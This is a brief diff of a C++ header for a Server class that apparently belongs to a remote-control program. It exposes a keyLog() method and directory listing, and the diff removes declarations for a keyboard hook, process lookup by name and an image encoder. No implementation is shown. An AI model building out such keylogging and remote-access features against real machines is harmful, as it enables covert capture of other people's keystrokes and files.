@@ -18,7 +18,7 @@ class Server{
 private:
     SOCKET disfd;
     SOCKET listener;
-    vector <WSAPOLLFD> pfds;
+    vector <pollfd> pfds;
 public:
     Server(const char* port);
     ~Server();
@@ -36,11 +36,4 @@ public:
     Response keyLog();
 
     Response dirTree(const char* pathName); 
-
-    Response disconnect();
 };
-
-DWORD GetProcessIdByName(const char* processName);
-string listDirectoryTree(const char* path, int indent);
-int GetEncoderClsid(const WCHAR* format, CLSID* pClsid);
-LRESULT CALLBACK KeyboardHookProc(int nCode, WPARAM wParam, LPARAM lParam);
